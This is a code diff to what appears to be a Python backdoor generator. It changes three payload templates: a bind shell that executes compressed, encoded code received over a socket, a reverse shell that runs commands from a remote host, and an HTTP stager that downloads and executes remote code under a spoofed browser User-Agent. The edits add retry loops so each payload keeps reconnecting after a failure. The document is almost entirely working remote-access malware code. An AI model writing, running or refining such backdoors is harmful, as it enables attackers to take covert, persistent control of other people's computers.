@@ -114,16 +114,23 @@ def gen_bind():
     with open(name, 'a+') as ina:
         ina.write('port = '+str(port))
         a = '''
-import zlib,base64,socket,struct
-b=socket.socket(2,socket.SOCK_STREAM)
-b.bind(('0.0.0.0',int(port)))
-b.listen(1)
-s,a=b.accept()
-l=struct.unpack('>I',s.recv(4))[0]
-d=s.recv(l)
-while len(d)<l:
-    d+=s.recv(l-len(d))
-exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+import zlib,base64,socket,struct,time
+def main():
+    try:
+        b=socket.socket(2,socket.SOCK_STREAM)
+        b.bind(('0.0.0.0',int(port)))
+        b.listen(1)
+        s,a=b.accept()
+        l=struct.unpack('>I',s.recv(4))[0]
+        d=s.recv(l)
+        while len(d)<l:
+            d+=s.recv(l-len(d))
+        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+    except Exception:
+        time.sleep(10)
+        main()
+main()
+
                 '''
         ina.write(a)
         ina.close
@@ -143,45 +150,50 @@ import socket
 import os
 import subprocess
 import sys
-
+import time
 SERVER_HOST = hototo
 SERVER_PORT = port
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
+def main():
+    try:
+        # create the socket object
+        s = socket.socket()
+        # connect to the server
+        s.connect((SERVER_HOST, SERVER_PORT))
+        # get the current directory
+        cwd = os.getcwd()
+        s.send(cwd.encode())
 
-# create the socket object
-s = socket.socket()
-# connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
-# get the current directory
-cwd = os.getcwd()
-s.send(cwd.encode())
-
-while True:
-    # receive the command from the server
-    command = s.recv(BUFFER_SIZE).decode()
-    splited_command = command.split()
-    if command.lower() == "exit":
-        break
-    if splited_command[0].lower() == "cd":
-        try:
-            os.chdir(' '.join(splited_command[1:]))
-        except FileNotFoundError as e:
-            output = str(e)
-        else:
-            # if operation is successful, empty message
-            output = ""
-    else:
-        # execute the command and retrieve the results
-        output = subprocess.getoutput(command)
-    # get the current working directory as output
-    cwd = os.getcwd()
-    # send the results back to the server
-    message = f"{output}{SEPARATOR}{cwd}"
-    s.send(message.encode())
-# close client connection
-s.close()     
+        while True:
+            # receive the command from the server
+            command = s.recv(BUFFER_SIZE).decode()
+            splited_command = command.split()
+            if command.lower() == "exit":
+                break
+            if splited_command[0].lower() == "cd":
+                try:
+                    os.chdir(' '.join(splited_command[1:]))
+                except FileNotFoundError as e:
+                    output = str(e)
+                else:
+                    # if operation is successful, empty message
+                    output = ""
+            else:
+                # execute the command and retrieve the results
+                output = subprocess.getoutput(command)
+            # get the current working directory as output
+            cwd = os.getcwd()
+            # send the results back to the server
+            message = f"{output}{SEPARATOR}{cwd}"
+            s.send(message.encode())
+        # close client connection
+        s.close()
+    except Exception:
+        time.sleep(10)
+        main()
+main()
                     '''
         ina.write(b)
         ina.close
@@ -197,15 +209,21 @@ def gen_rev_http():
         ina.write("\n")
         ina.write('hototo = "'+str(host)+'"')
         a = '''
-import zlib,base64,sys
-vi=sys.version_info
-ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
-hs=[]
-o=ul.build_opener(*hs)
-o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
-url = str("http://"+hototo+":"+port)
-exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
-                '''
+import zlib,base64,sys,time
+def main():
+    try:
+        vi=sys.version_info
+        ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
+        hs=[]
+        o=ul.build_opener(*hs)
+        o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
+        url = str("http://"+hototo+":"+port)
+        exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
+    except Exception:
+        time.sleep(10)
+        main()
+main()                
+'''
         ina.write(a)
         ina.close
         print('(*) Generated Backdoor and saved as '+name)
